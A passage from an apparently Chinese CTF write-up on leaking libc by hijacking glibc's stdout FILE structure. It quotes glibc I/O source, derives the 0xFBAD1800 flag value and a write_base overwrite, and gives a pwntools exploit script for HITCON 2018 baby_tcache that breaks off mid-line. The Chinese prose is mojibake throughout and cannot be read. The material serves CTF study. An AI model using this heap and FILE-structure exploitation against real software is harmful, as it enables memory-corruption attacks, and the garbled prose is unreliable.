class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<p>è¦åˆ¤æ–­flagæ˜¯ä»€ä¹ˆçŠ¶æ€å°±ç›´æ¥ä¸è¿™äº›å¸¸é‡æŒ‰ä½ä¸è¿ç®—ã€‚</p>
<h2 id="putså‡½æ•°æ‰§è¡Œæµç¨‹"><a href="#putså‡½æ•°æ‰§è¡Œæµç¨‹" class="headerlink" title="putså‡½æ•°æ‰§è¡Œæµç¨‹"></a>putså‡½æ•°æ‰§è¡Œæµç¨‹</h2><p>putså‡½æ•°ä¼šè°ƒç”¨_IO_putså‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ‰å®Œæˆputså‡½æ•°çš„åŠŸèƒ½ï¼Œä¸‹é¢æ˜¯æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æºä»£ç å¼•å…¥äº†libioP.håº“ï¼Œåœ¨ä»£ç ä¸­ä½¿ç”¨äº†_IO_sputnå®ï¼Œè¿™ä¸ªå®æ˜¯ _IO_stdout çš„è™šè¡¨vtableæŒ‡å‘çš„ _xsputn,è¿™é‡Œå‚¨å­˜ç€_IO_new_file_xsputnåœ°å€ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ã€‚</p>
<p>ç„¶åè¿™ä¸ªå‡½æ•°åˆä¼šè°ƒç”¨ï¼ˆå¦‚æœç›®æ ‡è¾“å‡ºæ•°æ®è¿˜æœ‰å‰©ä½™çš„è¯ï¼‰å°±ä¼šé€šè¿‡vtableè°ƒç”¨_IO_new_file_overflowï¼Œä¸‹é¢æ˜¯  _IO_new_file_overflowçš„æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å°±è°ƒç”¨äº† _io_do_writeå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æµfï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¾“å‡ºçš„èµ·å§‹åœ°å€f-&gt;_IO_write_baseï¼Œç¬¬ä¸‰ä¸ªè¾“å‡ºé•¿åº¦f-&gt;_IO_write_ptr - f-&gt;_IO_write_baseï¼Œå¦‚æœäº‹å…ˆèƒ½å¤Ÿæ§åˆ¶io_write_base,é‚£ä¹ˆå°±èƒ½ä»»ä¸€åœ°å€è¯»äº†ï¼Œä¹Ÿå°±å¯ä»¥leakå‡ºlibcçš„åœ°å€äº†ã€‚</p>
<h4 id="é‚£ä¹ˆç°åœ¨å°±æœ‰ä¸¤ä¸ªç›®æ ‡è¦å®Œæˆï¼Œä¸€ä¸ªæ˜¯æ§åˆ¶io-write-baseçš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨IO-new-file-overflowå‡½æ•°ä¸­å¦‚ä½•ç»•è¿‡æ¡ä»¶è°ƒç”¨io-do-write"><a href="#é‚£ä¹ˆç°åœ¨å°±æœ‰ä¸¤ä¸ªç›®æ ‡è¦å®Œæˆï¼Œä¸€ä¸ªæ˜¯æ§åˆ¶io-write-baseçš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨IO-new-file-overflowå‡½æ•°ä¸­å¦‚ä½•ç»•è¿‡æ¡ä»¶è°ƒç”¨io-do-write" class="headerlink" title="é‚£ä¹ˆç°åœ¨å°±æœ‰ä¸¤ä¸ªç›®æ ‡è¦å®Œæˆï¼Œä¸€ä¸ªæ˜¯æ§åˆ¶io_write_baseçš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨IO_new_file_overflowå‡½æ•°ä¸­å¦‚ä½•ç»•è¿‡æ¡ä»¶è°ƒç”¨io_do_write"></a>é‚£ä¹ˆç°åœ¨å°±æœ‰ä¸¤ä¸ªç›®æ ‡è¦å®Œæˆï¼Œä¸€ä¸ªæ˜¯æ§åˆ¶io_write_baseçš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨IO_new_file_overflowå‡½æ•°ä¸­å¦‚ä½•ç»•è¿‡æ¡ä»¶è°ƒç”¨io_do_write</h4><h2 id="ç»•è¿‡-IO-new-file-overflowå‡½æ•°çš„æ£€æŸ¥"><a href="#ç»•è¿‡-IO-new-file-overflowå‡½æ•°çš„æ£€æŸ¥" class="headerlink" title="ç»•è¿‡_IO_new_file_overflowå‡½æ•°çš„æ£€æŸ¥"></a>ç»•è¿‡<code>_IO_new_file_overflow</code>å‡½æ•°çš„æ£€æŸ¥</h2><p>è¿›å…¥<code>_IO_new_file_overflow</code>å‡½æ•°åä¼šç›´æ¥ç”¨flagä¸_IO_NO_WRITESå¸¸é‡åšä¸è¿ç®—ï¼Œå¦‚æœç»“æœä¸ºçœŸå°±ä¼šæŠ¥é”™é€€å‡ºç¨‹åºï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è¦è®©ç¨‹åºè¿è¡Œä¸‹å»æ‰§è¡Œio_do_writeå°±å¾—ç»•è¿‡è¿™ä¸ªif,è®©æ¡ä»¶ä¸ºå‡ï¼Œè¿™ä¸ª_IO_NO_WRITESæ˜¯ä¸€ä¸ªio_fileå®šä¹‰çš„å¸¸é‡ï¼Œè®©flagçš„å€’æ•°ç¬¬å››ä½ä¸º0å°±èƒ½ä¿è¯æ¡ä»¶åˆ¤æ–­ä¸ºå‡äº†ï¼Œ_flags = 0xfbad0000å°±è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæ£€æŸ¥ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>æ¡ä»¶æ˜¯æ£€æŸ¥è¾“å‡ºç¼“å­˜åŒºæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¿›å…¥åˆ†æ”¯ç„¶ååˆ†é…ç©ºé—´ï¼Œå¹¶ä¸”ä¼šåˆå§‹åŒ–æŒ‡é’ˆï¼Œä¹ŸåŒ…æ‹¬é‡ç½®f-&gt;_IO_write_baseæŒ‡é’ˆï¼Œè¿™æ ·çš„è¯å°±ç®—åŸå…ˆå¸ƒç½®äº†f-&gt;_IO_write_baseæŒ‡é’ˆä¹Ÿä¼šè¢«è¦†ç›–ï¼Œä»è€Œæ— æ³•ä»»æ„åœ°å€å†™ï¼Œæ‰€ä»¥è¿™ä¸ªæ¡ä»¶ä¹Ÿå¾—åˆ¤æ–­ä¸ºå‡ï¼Œè¿™ä¸ªæ¡ä»¶æ˜¯ä¸¤ä¸ªæ¡ä»¶æˆ–èµ·æ¥çš„ï¼Œä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ºå‡æ‰è¡Œï¼Œf-&gt;_IO_write_base == NULLè‚¯å®šä¸ºå‡ï¼Œæ‰€ä»¥é€šè¿‡å¸ƒç½®è®©f-&gt;_flags &amp; _IO_CURRENTLY_PUTTINGä¸ºå‡å°±å¥½ã€‚</p>
<p>_IO_CURRENTLY_PUTTINGå¸¸é‡è¿˜æ˜¯io_fileå®šä¹‰çš„ï¼Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br></pre></td></tr></table></figure>

<p>è¦ä½¿f-&gt;_flags &amp; _IO_CURRENTLY_PUTTINGä¸º1ï¼Œflag=0xfbad0800å°±èƒ½å®ç°ï¼Œè¿™ä¸ªflagè¿˜èƒ½ç»•è¿‡ä¸€ä¸ªæ£€æŸ¥</p>
<p>ç»•è¿‡è¿™ä¸¤ä¸ªæ£€æŸ¥å°±èƒ½é¡ºåˆ©è¿›å…¥io_do_wirteå‡½æ•°äº†ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°ååˆä¼šè¿›å…¥io_new_do_writeå‡½æ•°ï¼Œ</p>
<p>io_new_do_writeå‡½æ•°åˆä¼šè°ƒç”¨new_do_writeå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ€ç»ˆè°ƒç”¨ç³»ç»Ÿè°ƒç”¨writeå‡½æ•°ï¼Œå‰é¢çš„å‡½æ•°æ²¡å•¥æ£€æŸ¥ï¼Œæœ€ånew_do_writeè¿˜æœ‰ä¸€äº›æ£€æŸ¥ï¼ŒæŸ¥çœ‹æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆä¼šæ‰§è¡Œä¸€ä¸ªIfåˆ†æ”¯å’Œä¸€ä¸ªelse ifåˆ†æ”¯ï¼Œçœ‹elseifåˆ†æ”¯çš„æ¡ä»¶ï¼Œfp-&gt;_IO_read_end != fp-&gt;_IO_write_baseè¿™ä¸ªå¤§æ¦‚ç‡æ˜¯ä¸ç›¸ç­‰çš„,è¿™ä¸ªåˆ†æ”¯æ˜¯ä¸å»ºè®®è¿›å…¥çš„ï¼Œç½‘ä¸Šæœ‰å„ç§åŸå› å°±ä¸èµ˜è¿°äº†ï¼Œè¦æƒ³ä¸è¿›å…¥è¿™ä¸ªåˆ†æ”¯é‚£å°±åªèƒ½è¿›å…¥Ifåˆ†æ”¯äº†ï¼Œifåˆ†æ”¯çš„æ¡ä»¶æ˜¯fp-&gt;_flags &amp; _IO_IS_APPENDING</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure>

<p>åªè¦è®¾ç½®flag=0xFBAD1800å°±è¡Œäº†ã€‚</p>
<h2 id="åŠ«æŒstdout"><a href="#åŠ«æŒstdout" class="headerlink" title="åŠ«æŒstdout"></a>åŠ«æŒstdout</h2><p>æ®æˆ‘æ‰€çŸ¥å°±æ˜¯çˆ†ç ´,çˆ†ç ´ååå…­ä½ä¼ªé€ fdç”³è¯·stdout.</p>
<p>å’Œhouseofromanæ‰‹æ³•ååˆ†ç±»ä¼¼ï¼Œå…¶å®è¿™ç§æ²¡æœ‰leakçš„é¢˜ä¹Ÿå¯ä»¥ç›´æ¥houseofromanç›´æ¥åšï¼Œä¸è¿‡å°±æ˜¯æˆåŠŸç‡å¤ªä½äº†ï¼ˆè¦çˆ†ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡çˆ†ç ´èŒƒå›´è¿˜æŒºå¤§ï¼‰ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¦åˆ©ç”¨stdoutåªè¦ç”³è¯·åˆ°stdout(çœ‹è„¸)ç„¶åè®¾ç½®å¥½flag=0xFBAD1800å’Œwrite_baseå°±å¥½äº†ã€‚</p>
<h2 id="ä¾‹é¢˜-HITCON-2018-PWN-baby-tcache"><a href="#ä¾‹é¢˜-HITCON-2018-PWN-baby-tcache" class="headerlink" title="ä¾‹é¢˜ HITCON 2018 PWN baby_tcache"></a>ä¾‹é¢˜ HITCON 2018 PWN baby_tcache</h2><p>æ²¡æœ‰showå‡½æ•°ï¼Œå°±åƒå‰é¢æ€»ç»“çš„æ­¥éª¤ä¸€æ­¥æ­¥å®Œæˆå°±è¡Œï¼ˆå› ä¸ºè„¸é»‘å…³æ‰äº†aslrï¼‰</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">sh=process(<span class="string">&#x27;./baby_tcache&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x508</span>-<span class="number">0x10</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;\xe0\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x550</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(<span class="number">0x70</span>+<span class="number">0x80</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x60\xe7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span 